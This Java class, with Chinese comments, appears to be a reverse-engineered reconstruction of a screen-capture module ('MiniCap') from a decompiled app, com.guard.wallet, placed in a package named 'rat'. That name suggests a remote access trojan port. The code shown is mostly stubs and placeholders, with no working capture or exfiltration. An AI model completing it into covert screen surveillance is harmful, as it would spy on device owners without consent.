package com.vendor.rat.auto.engine;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

/**
 * MiniCap 屏幕截图管理
 *
 * Vendor: o/r.java (69 行)
 * 功能: 管理屏幕截图任务，支持 MediaProjection (API 30+)
 *        黑屏时限流 30 秒间隔
 *
 * 字段对齐:
 *   f693a → executorService (SingleThreadExecutor)
 *   b     → captureTask (thread.k 类型, 带 boolean 参数)
 *   c     → lastCaptureTime (AtomicLong)
 *
 * 方法对齐:
 *   a() → capture() (主截图方法, 含黑屏限流逻辑)
 *
 * 注意: vendor 的 a() 方法反编译失败，以下为 smali 逆向重建
 */
public final class MiniCapture {

    // ADAPT: f693a → executorService
    public final ExecutorService executorService = Executors.newSingleThreadExecutor();

    // ADAPT: b → captureTask, vendor 类型为 com.guard.wallet.thread.k
    // TODO: VENDOR_VERIFY - 需要确认 thread.k 的具体实现
    public final Object captureTask;

    // ADAPT: c → lastCaptureTime, 用于黑屏限流
    public final AtomicLong lastCaptureTime = new AtomicLong(0);

    public MiniCapture() {
        // ADAPT: vendor 构造 new com.guard.wallet.thread.k(true)
        // TODO: VENDOR_VERIFY - captureTask 的具体类型
        this.captureTask = null;
    }

    /**
     * 执行截图
     * ADAPT: a() → capture()
     *
     * 逻辑 (从 smali 重建):
     *   1. SDK < 30 → log "MiniCap use Media Projection" 并返回
     *   2. 检查是否黑屏 (com.guard.wallet.utils.e.j())
     *   3. 如果黑屏且距上次截图 < 30秒 → log "黑屏中,等待30秒..." 并返回
     *   4. 更新 lastCaptureTime
     *   5. 检查 captureTask 内部状态
     *   6. 如果未在运行 → submit captureTask 到 executorService
     */
    public final void capture() {
        // TODO: VENDOR_VERIFY - 方法反编译失败，以下为 smali 逆向重建
        int sdkInt = android.os.Build.VERSION.SDK_INT;
        String tag = "o.r";
        if (sdkInt < 30) {
            android.util.Log.d(tag, "MiniCap use Media Projection");
            return;
        }

        long now = System.currentTimeMillis();
        // ADAPT: com.guard.wallet.utils.e.j() → 检查屏幕是否亮着
        // TODO: VENDOR_VERIFY - 黑屏检测逻辑
        boolean screenOn = true; // placeholder

        if (!screenOn) {
            long last = lastCaptureTime.get();
            if (now - last < 30000) {
                android.util.Log.d(tag, "黑屏中,等待30秒...");
                return;
            }
            lastCaptureTime.set(now);
        }

        // ADAPT: 检查 captureTask 内部状态后 submit
        // TODO: VENDOR_VERIFY - captureTask 状态检查逻辑
        executorService.submit(() -> {
            // capture task execution
        });
    }
}
